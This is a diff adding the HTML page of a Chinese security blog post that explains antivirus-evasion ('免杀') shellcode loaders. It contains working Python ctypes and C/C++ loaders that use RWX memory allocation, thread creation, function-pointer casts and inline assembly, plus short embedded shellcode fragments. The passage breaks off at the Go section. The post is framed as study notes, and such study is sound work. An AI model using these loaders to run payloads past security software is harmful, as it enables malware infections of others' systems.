@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效果。 ​        目前来看分离免杀仍然是主流的一种免杀方式，我们可以将shellcode比作子弹，那么枪也就是我们所说的加载器。在这种情况下对于杀软来说，单纯的枪或者说子弹，都有可能绕过杀软。 python加载器核心代码: 1234567891011">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀学习--shellcode加载免杀">
+<meta property="og:url" content="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/index.html">
+<meta property="og:site_name" content="Shu1L&#39;s blog">
+<meta property="og:description" content="前言​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效果。 ​        目前来看分离免杀仍然是主流的一种免杀方式，我们可以将shellcode比作子弹，那么枪也就是我们所说的加载器。在这种情况下对于杀软来说，单纯的枪或者说子弹，都有可能绕过杀软。 python加载器核心代码: 1234567891011">
+<meta property="article:published_time" content="2021-08-17T06:02:57.000Z">
+<meta property="article:modified_time" content="2021-08-17T06:04:36.118Z">
+<meta property="article:author" content="Shu1L">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/"/>
+
+
+
+
+
+  <title>免杀学习--shellcode加载免杀 | Shu1L's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shu1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一只菜鸟白帽子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shu1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">免杀学习--shellcode加载免杀</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-17T14:02:57+08:00">
+                2021-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效果。</p>
+<p>​        目前来看分离免杀仍然是主流的一种免杀方式，我们可以将shellcode比作子弹，那么枪也就是我们所说的加载器。在这种情况下对于杀软来说，单纯的枪或者说子弹，都有可能绕过杀软。</p>
+<h3 id="python加载器"><a href="#python加载器" class="headerlink" title="python加载器"></a>python加载器</h3><p>核心代码:</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="title">shellcode</span> = bytearray(<span class="string">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"</span>)</span><br><span class="line"></span><br><span class="line">#通过调用<span class="type">VirtualAlloc</span>函数，申请一块动态内存区域</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),#要分配的内存区域的地址</span><br><span class="line">                                          ctypes.c_int(len(shellcode)), #分配的大小</span><br><span class="line">                                          ctypes.c_int(0x3000), #分配的类型</span><br><span class="line">                                          ctypes.c_int(0x40)) #该内存的初始保护属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">#调用<span class="type">RtlMoveMemory</span>函数，函数从我们指定的内存复制内容到另一内存</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">CreateThread</span>将在主线程的基础上创建一个新线程</span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">WaitForSingleObject</span>函数等待创建的线程运行结束。</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<p>代码不是很长，可以看到主要调用的就是ctypes这个库。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctypes</span> 是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</span><br></pre></td></tr></table></figure>
+
+<p>主要流程</p>
+<ul>
+<li>调用VirtualAlloc函数，来申请一块可读可写可执行的动态内存区域。</li>
+<li>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。</li>
+<li>调用CreateThread函数，在主线程的基础上创建一个新线程。</li>
+<li>调用WaitForSingleObject函数，等待创建的线程运行结束。</li>
+</ul>
+<p><strong>当然目前来说这种比较原始的方式杀软已经杀很严了，所以之后更多要有混淆加密的操作</strong>。</p>
+<p>常见的有Hex加密、AES加密、XOR加密、base64等等，或者可以自己写加密和解密，免杀效果会更好</p>
+<h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><h4 id="HEX加密"><a href="#HEX加密" class="headerlink" title="HEX加密"></a>HEX加密</h4><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">#sc = <span class="string">"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"</span></span><br><span class="line"><span class="title">shellcode</span>=bytearray(sys.argv[<span class="number">1</span>].decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h4><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">#<span class="type">REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA</span>==</span><br><span class="line"><span class="title">shellcode</span>=bytearray(base64.b64decode(sys.argv[<span class="number">1</span>]).decode(<span class="string">"hex"</span>))</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h3 id="C-加载器"><a href="#C-加载器" class="headerlink" title="C++加载器"></a>C++加载器</h3><p>对于C/C++来说，常用的加载方式有<strong>函数指针执行、内联汇编指令、伪指令等方式</strong>.</p>
+<h4 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h4><p>简单的C代码:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  (*(<span class="keyword">void</span>(*)() shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>(void(*)() shellcode</strong> 将shellcode转换为函数指针，指向void形式的函数，然后再通过一个*对指针进行取值，之后通过()双括号调用函数进而执行shell从而执行shellocde。</p>
+<h4 id="动态内存加载"><a href="#动态内存加载" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"Windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">"shellcode"</span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *Memory; </span><br><span class="line">	</span><br><span class="line"> 	Memory=VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	</span><br><span class="line"> 	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理和上面python实现类似。</p>
+<h4 id="内联汇编指令"><a href="#内联汇编指令" class="headerlink" title="内联汇编指令"></a>内联汇编指令</h4><p>汇编指令相关的知识可以看这里:</p>
+<p><a href="https://www.cxyzjd.com/article/Hkenter/2855771" target="_blank" rel="noopener">免杀、汇编指令大全_K的专栏-程序员宅基地 - 程序员宅基地 (cxyzjd.com)</a></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">//#pragma comment(linker,"/subsystem:<span class="symbol">\"</span>windows<span class="symbol">\"</span> /entry:<span class="symbol">\"</span>mainCRTStartup<span class="symbol">\"</span>")  // 隐藏控制台窗口显示</span><br><span class="line">#pragma comment(linker,"/INCREMENTAL:NO")                                     // 减小编译体积</span><br><span class="line">#pragma comment(linker, "/section:.data,RWE")                                 // 启用数据段可读写</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">"<span class="symbol">\x</span>d9<span class="symbol">\x</span>c5<span class="symbol">\x</span>d9<span class="symbol">\x</span>74<span class="symbol">\x</span>24<span class="symbol">\x</span>f4<span class="symbol">\x</span>ba<span class="symbol">\x</span>8b<span class="symbol">\x</span>fc<span class="symbol">\x</span>02<span class="symbol">\x</span>dd<span class="symbol">\x</span>5e<span class="symbol">\x</span>2b<span class="symbol">\x</span>c9<span class="symbol">\x</span>b1"</span><br><span class="line">"<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>ee<span class="symbol">\x</span>fc<span class="symbol">\x</span>31<span class="symbol">\x</span>56<span class="symbol">\x</span>14<span class="symbol">\x</span>03<span class="symbol">\x</span>56<span class="symbol">\x</span>9f<span class="symbol">\x</span>1e<span class="symbol">\x</span>f7<span class="symbol">\x</span>21<span class="symbol">\x</span>77<span class="symbol">\x</span>5c"</span><br><span class="line">"<span class="symbol">\x</span>f8<span class="symbol">\x</span>d9<span class="symbol">\x</span>87<span class="symbol">\x</span>01<span class="symbol">\x</span>70<span class="symbol">\x</span>3c<span class="symbol">\x</span>b6<span class="symbol">\x</span>01<span class="symbol">\x</span>e6<span class="symbol">\x</span>34<span class="symbol">\x</span>e8<span class="symbol">\x</span>b1<span class="symbol">\x</span>6c<span class="symbol">\x</span>18<span class="symbol">\x</span>04"</span><br><span class="line">"<span class="symbol">\x</span>39<span class="symbol">\x</span>20<span class="symbol">\x</span>89<span class="symbol">\x</span>9f<span class="symbol">\x</span>4f<span class="symbol">\x</span>ed<span class="symbol">\x</span>be<span class="symbol">\x</span>28<span class="symbol">\x</span>e5<span class="symbol">\x</span>cb<span class="symbol">\x</span>f1<span class="symbol">\x</span>a9<span class="symbol">\x</span>56<span class="symbol">\x</span>2f<span class="symbol">\x</span>93"</span><br><span class="line">"<span class="symbol">\x</span>ca<span class="symbol">\x</span>ec<span class="symbol">\x</span>3f<span class="symbol">\x</span>cd<span class="symbol">\x</span>34<span class="symbol">\x</span>a2<span class="symbol">\x</span>40<span class="symbol">\x</span>c4";</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		  mov eax, offset shellcode;</span><br><span class="line">		  JMP EAX</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他的写法:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">lea</span> eax, shellcode;  </span><br><span class="line">        <span class="attribute">jmp</span> eax;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>MOV EAX, offset shellcode</strong><br>此指令意为将 shellcode 放入到寄存器 EAX 中</p>
+<p><strong>JMP EAX</strong><br>无条件跳转到EAX</p>
+<h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>​    伪指令(Pseudo Instruction)是用于对汇编过程进行控制的指令，该类指令并不是可执行指令，没有机器代码，只用于汇编过程中为汇编程序提供汇编信息。 例如，提供如下信息：哪些是指令、哪些是数据及数据的字长、程序的起始地址和结束地址等。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode_5()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">mov</span> eax, offset shellcode;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xFF;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xE0;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="go加载器"><a href="#go加载器" class="headerlink" title="go加载器"></a>go加载器</h3><h4 id="动态内存加载-1"><a href="#动态内存加载-1" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><p>核心代码如下:</p>
